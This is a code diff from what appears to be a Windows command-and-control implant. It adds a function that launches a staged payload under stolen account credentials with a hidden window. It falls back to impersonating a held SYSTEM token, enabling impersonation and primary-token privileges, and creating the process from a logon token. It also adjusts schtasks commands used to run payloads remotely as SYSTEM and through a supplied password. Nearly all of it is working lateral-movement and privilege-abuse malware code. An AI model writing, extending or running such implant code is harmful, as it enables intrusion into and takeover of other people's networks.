@@ -242,6 +242,176 @@ static int shell_output_is_error(const char *out) {
     return 0;
 }
 
+/* CreateProcessWithLogonW is the credential-backed RunAs path.  It starts the
+   child immediately and avoids the Task Scheduler's mandatory /ST value for
+   ONCE tasks.  The token APIs below are compatibility fallbacks for hosts
+   where Secondary Logon or a local policy blocks the primary path. */
+static int spawn_as_user_direct(const char *path, const char *account,
+                                const char *password, DWORD *pid_out,
+                                char *err, size_t err_cap) {
+    if (!path || !path[0] || !account || !account[0] || !password) {
+        snprintf(err, err_cap, "runas: invalid direct-launch arguments");
+        return 0;
+    }
+    if (!CreateProcessWithLogonW && !LogonUserW) {
+        snprintf(err, err_cap, "runas: token process APIs unavailable");
+        return 0;
+    }
+
+    char user[256] = {0}, domain[256] = {0};
+    const char *sep = strchr(account, '\\');
+    if (!sep) sep = strchr(account, '/');
+    if (sep) {
+        size_t dlen = (size_t)(sep - account);
+        if (dlen == 0 || dlen >= sizeof(domain) || strlen(sep + 1) >= sizeof(user)) {
+            snprintf(err, err_cap, "runas: account name is too long");
+            return 0;
+        }
+        memcpy(domain, account, dlen); domain[dlen] = '\0';
+        strncpy(user, sep + 1, sizeof(user) - 1);
+    } else if (strchr(account, '@')) {
+        /* UPN form is accepted with a NULL domain. */
+        strncpy(user, account, sizeof(user) - 1);
+    } else {
+        strncpy(user, account, sizeof(user) - 1);
+        strncpy(domain, ".", sizeof(domain) - 1);
+    }
+
+    WCHAR wuser[256] = {0}, wdomain[256] = {0}, wpass[512] = {0};
+    WCHAR wpath[1024] = {0}, wcmd[1100] = {0};
+    WCHAR wcmd_as_user[1100] = {0}, wcmd_with_token[1100] = {0};
+    if (!MultiByteToWideChar(CP_ACP, 0, user, -1, wuser,
+                             (int)(sizeof(wuser) / sizeof(wuser[0])))) {
+        snprintf(err, err_cap, "runas: user conversion failed");
+        return 0;
+    }
+    if (domain[0] && !MultiByteToWideChar(CP_ACP, 0, domain, -1, wdomain,
+                                          (int)(sizeof(wdomain) / sizeof(wdomain[0])))) {
+        snprintf(err, err_cap, "runas: domain conversion failed");
+        return 0;
+    }
+    if (!MultiByteToWideChar(CP_ACP, 0, password, -1, wpass,
+                             (int)(sizeof(wpass) / sizeof(wpass[0])))) {
+        snprintf(err, err_cap, "runas: password conversion failed");
+        return 0;
+    }
+    if (!MultiByteToWideChar(CP_ACP, 0, path, -1, wpath,
+                             (int)(sizeof(wpath) / sizeof(wpath[0])))) {
+        snprintf(err, err_cap, "runas: payload path conversion failed");
+        return 0;
+    }
+    if (swprintf_s(wcmd, sizeof(wcmd) / sizeof(wcmd[0]), L"\"%ls\"", wpath) < 0) {
+        snprintf(err, err_cap, "runas: payload command line is too long");
+        return 0;
+    }
+    memcpy(wcmd_as_user, wcmd, sizeof(wcmd_as_user));
+    memcpy(wcmd_with_token, wcmd, sizeof(wcmd_with_token));
+
+    STARTUPINFOW si = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi = {0};
+    BOOL created = FALSE;
+    DWORD with_logon_err = 0, batch_err = 0, interactive_err = 0;
+    DWORD as_user_err = 0, with_token_err = 0;
+    LPCWSTR domain_ptr = domain[0] ? wdomain : NULL;
+
+    /* Credential-backed launch: create the child immediately without the
+       Task Scheduler. */
+    if (CreateProcessWithLogonW) {
+        created = CreateProcessWithLogonW(wuser, domain_ptr, wpass, 0,
+            wpath, wcmd, CREATE_NO_WINDOW, NULL,
+            L"C:\\Windows\\System32", &si, &pi);
+        if (!created) with_logon_err = GetLastError();
+    }
+    if (created) {
+        if (pid_out) *pid_out = pi.dwProcessId;
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return 1;
+    }
+
+    /* Compatibility path: use a real primary logon token when Secondary Logon
+       is disabled or the credential-backed API is blocked by local policy. */
+    BOOL impersonated = FALSE;
+    HANDLE system_token = (HANDLE)InterlockedCompareExchangePointer(
+        (PVOID*)&g_system_token, NULL, NULL);
+    if (system_token && ImpersonateLoggedOnUser(system_token)) {
+        impersonated = TRUE;
+        enable_privilege(system_token, "SeImpersonatePrivilege");
+        enable_privilege(system_token, "SeIncreaseQuotaPrivilege");
+        enable_privilege(system_token, "SeAssignPrimaryTokenPrivilege");
+    }
+
+    HANDLE self = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &self)) {
+        enable_privilege(self, "SeImpersonatePrivilege");
+        enable_privilege(self, "SeIncreaseQuotaPrivilege");
+        enable_privilege(self, "SeAssignPrimaryTokenPrivilege");
+        CloseHandle(self);
+    }
+
+    HANDLE user_token = NULL;
+    BOOL logged = FALSE;
+    if (LogonUserW) {
+        logged = LogonUserW(wuser, domain_ptr, wpass,
+                            LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &user_token);
+        if (!logged) {
+            batch_err = GetLastError();
+            /* Some policies do not grant SeBatchLogonRight. */
+            logged = LogonUserW(wuser, domain_ptr, wpass,
+                                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
+                                &user_token);
+            if (!logged) interactive_err = GetLastError();
+        }
+    }
+    if (logged) {
+        if (CreateProcessAsUserW) {
+            created = CreateProcessAsUserW(user_token, wpath, wcmd_as_user,
+                NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL,
+                L"C:\\Windows\\System32", &si, &pi);
+            if (!created) as_user_err = GetLastError();
+        }
+        if (!created && CreateProcessWithTokenW) {
+            created = CreateProcessWithTokenW(user_token, 0, wpath, wcmd_with_token,
+                CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32", &si, &pi);
+            if (!created) with_token_err = GetLastError();
+        }
+    }
+    if (!created) {
+        snprintf(err, err_cap,
+                 "runas: direct launch failed; LogonW=%lu batch=%lu interactive=%lu AsUser=%lu WithToken=%lu",
+                 (unsigned long)with_logon_err, (unsigned long)batch_err,
+                 (unsigned long)interactive_err, (unsigned long)as_user_err,
+                 (unsigned long)with_token_err);
+        goto direct_done;
+    }
+    if (pid_out) *pid_out = pi.dwProcessId;
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    {
+        int ok = 1;
+        CloseHandle(user_token);
+        user_token = NULL;
+        if (impersonated) RevertToSelf();
+        return ok;
+    }
+
+direct_done:
+    if (user_token) CloseHandle(user_token);
+    if (impersonated) RevertToSelf();
+    return 0;
+}
+
+static void runas_start_time(char *out, size_t out_cap) {
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    int total = (int)st.wHour * 60 + (int)st.wMinute + 2;
+    total %= 24 * 60;
+    snprintf(out, out_cap, "%02d:%02d", total / 60, total % 60);
+}
+
 // ── Directory listing ─────────────────────────────────────────────────────────
 
 static char* do_ls(const char *path) {
@@ -3529,10 +3699,12 @@ void dispatch_task(AgentTask *task) {
             snprintf(outf,sizeof(outf),"\\\\%s\\admin$\\__eg_out_%lu.txt",
                 lat_host,(unsigned long)GetCurrentProcessId());
             /* Create task */
+            char at_start[8];
+            runas_start_time(at_start, sizeof(at_start));
             snprintf(lat_buf,sizeof(lat_buf),
-                "schtasks /Create /S %s /RU SYSTEM /SC ONCE /ST 00:00 /F "
+                "schtasks /Create /S %s /RU SYSTEM /SC ONCE /ST %s /F "
                 "/TN %s /TR \"cmd /c %s > %s 2>&1\" 2>&1",
-                lat_host,at_tn,lat_cmd,outf);
+                lat_host,at_start,at_tn,lat_cmd,outf);
             char *lr2=run_shell(lat_buf); free(lr2);
             /* Run task */
             snprintf(lat_buf,sizeof(lat_buf),
@@ -3620,8 +3792,8 @@ void dispatch_task(AgentTask *task) {
                 "[+] psexec → %s\n    svc : %s\n    path: %s", lat_host, svc_name, remote_path);
             agent_send_result(task->id, res_ps, "");
         } else if (_stricmp(lat_method,"runas")==0) {
-            /* Run payload as local user via schtasks.
-             * Copy to C:\Users\Public\ so the target user can read it. */
+            /* Prefer direct credential-backed creation, with token APIs inside
+             * the helper as a compatibility fallback. */
             char ru_tn[32];
             snprintf(ru_tn, sizeof(ru_tn), "svc%08x", (unsigned)GetTickCount());
             const char *ru=lat_user;
@@ -3644,19 +3816,38 @@ void dispatch_task(AgentTask *task) {
                 agent_send_result(task->id, "", "runas: could not stage payload in C:\\Users\\Public");
                 return;
             }
+            char direct_err[256] = {0};
+            DWORD direct_pid = 0;
+            if (spawn_as_user_direct(pub_path, lat_user, lat_pass, &direct_pid,
+                                     direct_err, sizeof(direct_err))) {
+                char direct_res[1024];
+                snprintf(direct_res, sizeof(direct_res),
+                         "[+] runas → %s @ %s\n    cmd: %s\n    pid: %lu\n    method: direct credentials/token (CreateProcessWithLogonW preferred)",
+                         ru, lat_host, pub_path, (unsigned long)direct_pid);
+                agent_send_result(task->id, direct_res, "");
+                return;
+            }
+
             char ru_res[4096]={0};
+            char start_at[8];
+            runas_start_time(start_at, sizeof(start_at));
             snprintf(lat_buf,sizeof(lat_buf),
-                "schtasks /Create /SC ONCE /ST 00:00 /RL HIGHEST /F /TN %s "
+                "schtasks /Create /SC ONCE /ST %s /RL HIGHEST /F /TN %s "
                 "/TR \"%s\" /RU \"%s\" /RP \"%s\" 2>&1",
-                ru_tn,pub_path,ru,lat_pass);
+                start_at,ru_tn,pub_path,ru,lat_pass);
             char *rr1=run_shell(lat_buf);
             if (shell_output_is_error(rr1)) {
-                agent_send_result(task->id, "", rr1 ? rr1 : "runas: schtasks /Create failed");
+                char fallback_err[4608];
+                snprintf(fallback_err, sizeof(fallback_err),
+                         "[direct token failed: %s]\n%s", direct_err,
+                         rr1 ? rr1 : "runas: schtasks /Create failed");
+                agent_send_result(task->id, "", fallback_err);
                 free(rr1);
                 return;
             }
-            snprintf(ru_res,sizeof(ru_res),"[+] runas → %s @ %s\n    cmd: %s\n%s\n",
-                ru,lat_host,pub_path,rr1?rr1:"");
+            snprintf(ru_res,sizeof(ru_res),
+                     "[+] runas → %s @ %s\n    cmd: %s\n    method: schtasks fallback (/ST %s)\n    direct token failed: %s\n%s\n",
+                ru,lat_host,pub_path,start_at,direct_err,rr1?rr1:"");
             free(rr1);
             snprintf(lat_buf,sizeof(lat_buf),"schtasks /Run /TN %s 2>&1",ru_tn);
             char *rr2=run_shell(lat_buf);
